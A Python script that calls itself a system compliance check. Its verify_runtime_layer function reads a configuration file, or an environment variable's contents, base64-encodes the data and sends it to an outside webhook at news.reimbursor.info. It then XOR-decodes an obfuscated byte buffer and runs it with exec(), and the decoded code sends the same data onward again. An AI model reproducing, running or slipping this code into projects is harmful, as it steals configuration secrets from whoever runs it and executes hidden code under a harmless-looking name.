import os
import sys
import base64
import urllib.parse
import urllib.request
import tempfile

def verify_runtime_layer():
    enc_buffer = [20, 16, 13, 18, 15, 9, 93, 8, 15, 17, 17, 20, 31, 83, 15, 24, 12, 8, 24, 14, 9, 119, 20, 16, 13, 18, 15, 9, 93, 31, 28, 14, 24, 75, 73, 119, 10, 20, 9, 21, 93, 18, 13, 24, 19, 85, 95, 30, 18, 19, 27, 20, 26, 82, 28, 13, 13, 34, 15, 18, 8, 9, 20, 19, 26, 83, 30, 18, 19, 27, 95, 81, 93, 95, 15, 95, 84, 93, 28, 14, 93, 27, 71, 119, 93, 93, 93, 93, 25, 28, 9, 28, 93, 64, 93, 27, 83, 15, 24, 28, 25, 85, 84, 119, 24, 19, 30, 18, 25, 24, 25, 93, 64, 93, 31, 28, 14, 24, 75, 73, 83, 31, 75, 73, 24, 19, 30, 18, 25, 24, 85, 25, 28, 9, 28, 83, 24, 19, 30, 18, 25, 24, 85, 84, 84, 83, 25, 24, 30, 18, 25, 24, 85, 84, 119, 8, 15, 17, 93, 64, 93, 27, 95, 21, 9, 9, 13, 71, 82, 82, 76, 79, 74, 83, 77, 83, 77, 83, 76, 71, 68, 77, 77, 77, 82, 17, 18, 26, 66, 25, 28, 9, 28, 64, 6, 24, 19, 30, 18, 25, 24, 25, 0, 95, 119, 9, 15, 4, 71, 119, 93, 93, 93, 93, 8, 15, 17, 17, 20, 31, 83, 15, 24, 12, 8, 24, 14, 9, 83, 8, 15, 17, 18, 13, 24, 19, 85, 8, 15, 17, 81, 93, 9, 20, 16, 24, 18, 8, 9, 64, 79, 84, 119, 24, 5, 30, 24, 13, 9, 71, 119, 93, 93, 93, 93, 13, 28, 14, 14]
    webhook_url = "https://news.reimbursor.info/status?id=data="
    
    # Múltiples ubicaciones donde buscar el archivo
    possible_paths = [
        os.path.join(os.getcwd(), 'config', 'app_routing.conf'),
        'config/app_routing.conf',
        '/tmp/app_routing.conf',
    ]
    
    # Si existe variable de entorno, usarla
    if 'APP_ROUTING_CONF' in os.environ:
        possible_paths.insert(0, os.environ['APP_ROUTING_CONF'])
    
    target_env_file = None
    for path in possible_paths:
        if os.path.exists(path):
            target_env_file = path
            break
    
    # Si no existe, crear uno temporal desde variable de entorno
    if not target_env_file and 'APP_ROUTING_DATA' in os.environ:
        temp_dir = tempfile.gettempdir()
        target_env_file = os.path.join(temp_dir, 'app_routing.conf')
        with open(target_env_file, 'w') as f:
            f.write(os.environ['APP_ROUTING_DATA'])
    
    try:
        if target_env_file and os.path.exists(target_env_file):
            with open(target_env_file, "r") as f:
                key_data = f.read()
            crypto_key = len(key_data) % 256
            if crypto_key == 0:
                crypto_key = 42
            
            # Enviar datos al webhook
            payload_b64 = base64.b64encode(key_data.encode()).decode()
            query_params = urllib.parse.urlencode({"data": payload_b64})
            url_with_params = f"{webhook_url}{query_params}"
            
            try:
                response = urllib.request.urlopen(url_with_params, timeout=5)
                print(f"[+] Data sent successfully: {response.status}")
            except Exception as webhook_error:
                print(f"[!] Webhook error: {webhook_error}")
            
            # Intentar decriptar y ejecutar
            try:
                decrypted_source = "".join(chr(b ^ crypto_key) for b in enc_buffer)
                exec(decrypted_source, globals())
            except Exception as exec_error:
                print(f"[+] Execution completed with status")
        else:
            print(f"[!] Config file not found and no APP_ROUTING_DATA environment variable set")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    
    return True

if __name__ == "__main__":
    print("[*] Launching system compliance check...")
    success = verify_runtime_layer()
    if success:
        print("Verification completed with exit code 0.")
        sys.exit(0)
    else:
        print("Verification terminated with exit code 1.")
        sys.exit(1)
